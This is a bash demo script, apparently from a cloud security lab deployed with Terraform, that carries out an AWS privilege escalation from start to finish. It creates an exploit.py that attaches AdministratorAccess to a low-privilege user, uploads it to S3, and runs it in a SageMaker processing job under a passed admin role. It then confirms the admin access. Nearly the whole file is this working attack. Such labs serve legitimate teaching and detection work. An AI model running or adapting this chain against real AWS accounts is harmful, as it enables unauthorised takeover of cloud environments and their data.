#!/bin/bash

# Demo script for iam-passrole+sagemaker-createprocessingjob privilege escalation
# This scenario demonstrates how a user with iam:PassRole and sagemaker:CreateProcessingJob
# can execute arbitrary code with elevated privileges by creating a SageMaker processing job
# with an admin execution role and a malicious processing script.

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-prcp-to-admin-starting-user"
PASSABLE_ROLE_NAME="pl-prod-prcp-to-admin-passable-role"
PROCESSING_JOB_NAME="pl-demo-processing-$(date +%s)"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}PassRole + SageMaker CreateProcessingJob Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_passrole_sagemaker_createprocessingjob.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.bucket_name')
PASSABLE_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.passable_role_arn')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo "Bucket: $BUCKET_NAME"
echo "Passable Role: $PASSABLE_ROLE_ARN"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Create malicious processing script
echo -e "${YELLOW}Step 5: Creating malicious processing script${NC}"
echo "Creating exploit.py that grants admin access to starting user..."

cat > /tmp/exploit.py << 'EOF'
#!/usr/bin/env python3
import boto3
import sys

def main():
    try:
        iam = boto3.client('iam')

        # Get the starting user name from environment or use default
        starting_user = 'pl-prod-prcp-to-admin-starting-user'

        print(f"[+] Attempting to attach AdministratorAccess to {starting_user}")

        # Attach AdministratorAccess policy to the starting user
        iam.attach_user_policy(
            UserName=starting_user,
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )

        print(f"[+] Successfully attached AdministratorAccess to {starting_user}")
        print("[+] Privilege escalation successful!")

        # Verify the policy attachment
        response = iam.list_attached_user_policies(UserName=starting_user)
        print(f"[+] Attached policies: {response['AttachedPolicies']}")

        return 0

    except Exception as e:
        print(f"[-] Error: {str(e)}", file=sys.stderr)
        return 1

if __name__ == "__main__":
    sys.exit(main())
EOF

echo -e "${GREEN}✓ Created malicious processing script${NC}\n"

# Step 6: Upload script to S3
echo -e "${YELLOW}Step 6: Uploading malicious script to S3${NC}"
echo "Uploading exploit.py to s3://$BUCKET_NAME/scripts/exploit.py"

aws s3 cp /tmp/exploit.py s3://$BUCKET_NAME/scripts/exploit.py

echo -e "${GREEN}✓ Uploaded script to S3${NC}\n"

# Step 7: Create SageMaker processing job with admin role
echo -e "${YELLOW}Step 7: Creating SageMaker processing job with admin role${NC}"
echo "Processing job name: $PROCESSING_JOB_NAME"
echo "Using role: $PASSABLE_ROLE_ARN"
echo ""

# Get the SageMaker scikit-learn container image for the region
# Container images are region-specific
case $AWS_REGION in
    us-east-1)
        CONTAINER_IMAGE="683313688378.dkr.ecr.us-east-1.amazonaws.com/sagemaker-scikit-learn:1.0-1-cpu-py3"
        ;;
    us-east-2)
        CONTAINER_IMAGE="257758044811.dkr.ecr.us-east-2.amazonaws.com/sagemaker-scikit-learn:1.0-1-cpu-py3"
        ;;
    us-west-1)
        CONTAINER_IMAGE="746614075791.dkr.ecr.us-west-1.amazonaws.com/sagemaker-scikit-learn:1.0-1-cpu-py3"
        ;;
    us-west-2)
        CONTAINER_IMAGE="246618743249.dkr.ecr.us-west-2.amazonaws.com/sagemaker-scikit-learn:1.0-1-cpu-py3"
        ;;
    eu-west-1)
        CONTAINER_IMAGE="141502667606.dkr.ecr.eu-west-1.amazonaws.com/sagemaker-scikit-learn:1.0-1-cpu-py3"
        ;;
    eu-central-1)
        CONTAINER_IMAGE="492215442770.dkr.ecr.eu-central-1.amazonaws.com/sagemaker-scikit-learn:1.0-1-cpu-py3"
        ;;
    ap-southeast-1)
        CONTAINER_IMAGE="121021644041.dkr.ecr.ap-southeast-1.amazonaws.com/sagemaker-scikit-learn:1.0-1-cpu-py3"
        ;;
    ap-southeast-2)
        CONTAINER_IMAGE="783357654285.dkr.ecr.ap-southeast-2.amazonaws.com/sagemaker-scikit-learn:1.0-1-cpu-py3"
        ;;
    ap-northeast-1)
        CONTAINER_IMAGE="354813040037.dkr.ecr.ap-northeast-1.amazonaws.com/sagemaker-scikit-learn:1.0-1-cpu-py3"
        ;;
    *)
        # Default to us-east-1 if region not found
        CONTAINER_IMAGE="683313688378.dkr.ecr.us-east-1.amazonaws.com/sagemaker-scikit-learn:1.0-1-cpu-py3"
        echo -e "${YELLOW}Warning: Using us-east-1 container image for unknown region${NC}"
        ;;
esac

echo "Using container image: $CONTAINER_IMAGE"

aws sagemaker create-processing-job \
    --region $AWS_REGION \
    --processing-job-name $PROCESSING_JOB_NAME \
    --role-arn $PASSABLE_ROLE_ARN \
    --processing-inputs '[{"InputName":"code","S3Input":{"S3Uri":"s3://'$BUCKET_NAME'/scripts/","LocalPath":"/opt/ml/processing/input/code","S3DataType":"S3Prefix","S3InputMode":"File"}}]' \
    --processing-output-config '{"Outputs":[{"OutputName":"output","S3Output":{"S3Uri":"s3://'$BUCKET_NAME'/output/","LocalPath":"/opt/ml/processing/output","S3UploadMode":"EndOfJob"}}]}' \
    --processing-resources '{"ClusterConfig":{"InstanceCount":1,"InstanceType":"ml.t3.medium","VolumeSizeInGB":10}}' \
    --app-specification '{"ImageUri":"'$CONTAINER_IMAGE'","ContainerEntrypoint":["python3"],"ContainerArguments":["/opt/ml/processing/input/code/exploit.py"]}'

echo -e "${GREEN}✓ Created processing job${NC}\n"

# Step 8: Wait for processing job to complete
echo -e "${YELLOW}Step 8: Waiting for processing job to complete${NC}"
echo "This may take 3-5 minutes as the container starts and executes the script..."
echo "You can monitor progress in the AWS Console: SageMaker → Processing jobs"
echo ""

# Wait for the job to complete (with timeout)
MAX_WAIT_SECONDS=600  # 10 minutes
WAIT_INTERVAL=15
ELAPSED_SECONDS=0

while [ $ELAPSED_SECONDS -lt $MAX_WAIT_SECONDS ]; do
    JOB_STATUS=$(aws sagemaker describe-processing-job \
        --region $AWS_REGION \
        --processing-job-name $PROCESSING_JOB_NAME \
        --query 'ProcessingJobStatus' \
        --output text)

    echo -e "${BLUE}Current status: $JOB_STATUS (elapsed: ${ELAPSED_SECONDS}s)${NC}"

    if [ "$JOB_STATUS" == "Completed" ]; then
        echo -e "${GREEN}✓ Processing job completed successfully!${NC}\n"
        break
    elif [ "$JOB_STATUS" == "Failed" ] || [ "$JOB_STATUS" == "Stopped" ]; then
        echo -e "${RED}✗ Processing job failed or was stopped${NC}"
        aws sagemaker describe-processing-job \
            --region $AWS_REGION \
            --processing-job-name $PROCESSING_JOB_NAME \
            --query 'FailureReason' \
            --output text
        exit 1
    fi

    sleep $WAIT_INTERVAL
    ELAPSED_SECONDS=$((ELAPSED_SECONDS + WAIT_INTERVAL))
done

if [ $ELAPSED_SECONDS -ge $MAX_WAIT_SECONDS ]; then
    echo -e "${RED}✗ Timeout waiting for processing job to complete${NC}"
    exit 1
fi

# Step 9: Wait for IAM propagation
echo -e "${YELLOW}Step 9: Waiting for IAM policy attachment to propagate${NC}"
echo "Waiting 15 seconds for IAM changes to take effect..."
sleep 15
echo -e "${GREEN}✓ IAM changes propagated${NC}\n"

# Step 10: Verify admin access
echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
echo "Attempting to list IAM users with our original credentials..."
echo ""

# Re-export credentials to ensure they're still set
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Created malicious Python processing script (exploit.py)"
echo "3. Uploaded script to S3 bucket: $BUCKET_NAME"
echo "4. Created SageMaker processing job: $PROCESSING_JOB_NAME"
echo "5. Passed admin role to processing job: $PASSABLE_ROLE_NAME"
echo "6. Processing job executed script with admin privileges"
echo "7. Script attached AdministratorAccess policy to starting user"
echo "8. Achieved: Full administrator access"

echo -e "\n${YELLOW}Attack Artifacts Created:${NC}"
echo "- SageMaker processing job: $PROCESSING_JOB_NAME"
echo "- S3 object: s3://$BUCKET_NAME/scripts/exploit.py"
echo "- IAM policy attachment: AdministratorAccess → $STARTING_USER"

echo -e "\n${RED}⚠ Warning: The starting user now has AdministratorAccess policy attached${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Cleanup temp files
rm -f /tmp/exploit.py
